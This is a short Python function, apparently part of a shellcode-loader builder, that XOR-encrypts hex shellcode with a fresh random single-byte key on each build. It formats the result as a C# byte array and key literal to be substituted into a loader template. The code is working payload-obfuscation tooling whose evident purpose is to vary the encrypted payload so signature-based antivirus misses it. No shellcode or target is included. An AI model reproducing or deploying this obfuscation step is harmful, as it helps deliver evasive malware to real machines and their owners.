import os


def xor_encrypt_shellcode(shellcode_hex):
    """XOR encrypt shellcode with a fresh random single-byte key per build.

    Returns a dict for template substitution:
      - blob: encrypted ciphertext as a C# byte[] declaration  (placeholder: {encrypted_shellcode})
      - key : random XOR key as a C# byte literal, e.g. '0x4F' (placeholder: {xor_key})
    """
    key = os.urandom(1)[0]
    while key == 0:  # avoid no-op key
        key = os.urandom(1)[0]

    data = bytes.fromhex(shellcode_hex)
    encrypted = bytes(b ^ key for b in data)

    blob = (f"byte[] buf = new byte[{len(encrypted)}] {{ "
            + ",".join(f"0x{b:02X}" for b in encrypted)
            + " };")

    return {
        'blob': blob,
        'key':  f"0x{key:02X}",
    }
